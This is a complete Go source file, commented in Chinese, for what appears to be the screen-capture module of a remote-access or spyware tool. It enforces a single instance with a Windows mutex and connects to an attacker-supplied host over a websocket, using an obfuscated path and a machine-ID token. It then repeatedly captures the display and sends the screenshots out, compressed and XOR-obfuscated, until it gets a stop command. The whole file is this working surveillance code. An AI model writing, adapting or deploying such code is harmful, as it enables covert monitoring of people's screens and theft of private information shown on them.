package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/denisbrodbeck/machineid"
	"github.com/kbinani/screenshot"
	"golang.org/x/net/websocket"
	"image/png"
	"io/ioutil"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

const (
	ON_SCREEN  = "70" //打开监控屏幕
	OFF_SCREEN = "71" //关闭监控屏幕

	strKEY = "fhu84ygf8643" //字符串加密key
)

var (
	baseUrl      string
	conn         *websocket.Conn
	origin       string
	url          string
	Machineid    = getMachineid()
	intervalTime = 3000
)

type Message struct {
	Uuid      string `json:"uuid"`
	Machineid string `json:"machineid"` //客户端唯一识别码
	Ip        string `json:"ip"`
	Name      string `json:"name"`
	Msg       string `json:"msg"`

	ByteData []byte `json:"byteData"` //截屏,文件，等等大的数据
	FileName string `json:"fileName"`
	//FileBody string `json:"fileBody"`
}

func creatWebsocket() (*websocket.Conn, error) {
	return websocket.Dial(url, token(), origin)
}
func token() string {
	Unow := time.Now().Unix()
	tokenBytes := encDec([]byte(fmt.Sprint(Unow) + "--" + Machineid)) //当前时间戳+系统的唯一识别码
	token := base64.StdEncoding.EncodeToString(tokenBytes)
	return token
}
func getMachineid() string { //每个系统的唯一识别码
	m, _ := machineid.ID()
	return m
}
func encDec(byt []byte) []byte {
	for i, v := range byt {
		byt[i] = (byte(i+95) & (^v)) | (v & (^byte(i + 95)))
	}
	return byt
}

//读取数据
func readMessage(conn *websocket.Conn) ([]byte, error) {
again:
	fr, err := conn.NewFrameReader()

	if err != nil {
		return nil, err
	}
	frame, err := conn.HandleFrame(fr)
	if err != nil {
		return nil, err
	}
	if frame == nil {
		goto again
	}
	reqBytes, err := ioutil.ReadAll(frame)
	if err != nil {
		return reqBytes, err
	}
	reqBytes = encDec(reqBytes)      //解密数据
	reqBytes = UnGzipBytes(reqBytes) //解压数据
	return reqBytes, nil
}

//发送websocket消息
func sendMessage(message Message) error {
	jsonBytes, _ := json.Marshal(message) //结构体转json
	jsonBytes = gzipBytes(jsonBytes)      //压缩结构体
	jsonBytes = encDec(jsonBytes)         //加密
	if conn != nil {
		_, err := conn.Write(jsonBytes) //发送消息
		return err
	} else {
		return errors.New("conn is null pointer")
	}
}

//gzip压缩
func gzipBytes(byt []byte) []byte {
	var buf bytes.Buffer
	//zw := gzip.NewWriter(&buf)
	zw, _ := gzip.NewWriterLevel(&buf, gzip.BestCompression)

	zw.Write(byt)
	if err := zw.Close(); err != nil {
	}
	return buf.Bytes()
}

//gzip解压缩
func UnGzipBytes(byt []byte) []byte {
	var buf bytes.Buffer
	buf.Write(byt)
	zr, _ := gzip.NewReader(&buf)
	defer func() {
		if zr != nil {
			zr.Close()
		}
	}()
	a, _ := ioutil.ReadAll(zr)
	return a
}
func json2Message(strByte []byte) (Message, error) {
	var dat Message
	if err := json.Unmarshal(strByte, &dat); err == nil {
		return dat, nil
	} else {
		return dat, err
	}
}

func windowsLock() bool {

	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return false
	}
	CreateMutexA, err := kernel32.FindProc("CreateMutexA")
	if err != nil {
		return false
	}
	_, _, lastErr := CreateMutexA.Call(uintptr(0), 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Local\\aaaa"))))
	if lastErr != nil && lastErr.Error() != "The operation completed successfully." {
		return false
	}
	return true
}

func onScreen() { //监控屏幕
	message := Message{Name: ON_SCREEN, Machineid: Machineid}
	for {
		img, _ := screenshot.CaptureDisplay(0)
		var b bytes.Buffer
		_ = png.Encode(&b, img)

		message.ByteData = b.Bytes()
		err := sendMessage(message)
		if err != nil { //连接出错
			return
		}
		time.Sleep(time.Duration(intervalTime) * time.Millisecond) //间隔时间
	}
}

//关闭退出
func settingScreen() {
	reqBytes, err := readMessage(conn) //会阻塞，直到收到消息或者报错
	if err != nil {
		os.Exit(0)
	}
	reqM, err := json2Message(reqBytes)
	if err != nil {
		os.Exit(0)
	}
	if reqM.Name == OFF_SCREEN {
		os.Exit(0)
	}
}
func main() {
	if !windowsLock() { //互斥锁
		return
	}
	if len(os.Args) != 3 { //屏幕比例，刷新间隔，url
		return
	}
	intervalTime, _ = strconv.Atoi(os.Args[1]) //截屏间隔时间毫秒
	if intervalTime == 0 {                     //传错参数则纠正为1秒一次
		intervalTime = 3000
	}
	baseUrl = os.Args[2]
	origin = "http://" + baseUrl + "/"
	url = "ws://" + baseUrl + "/screenhfuiefdhuiwe32uhi"

	var err error
	conn, err = creatWebsocket()
	defer func() {
		if conn != nil {
			conn.Close()
		}
	}()

	if err != nil {
		return
	}
	go settingScreen() //设置
	onScreen()
}
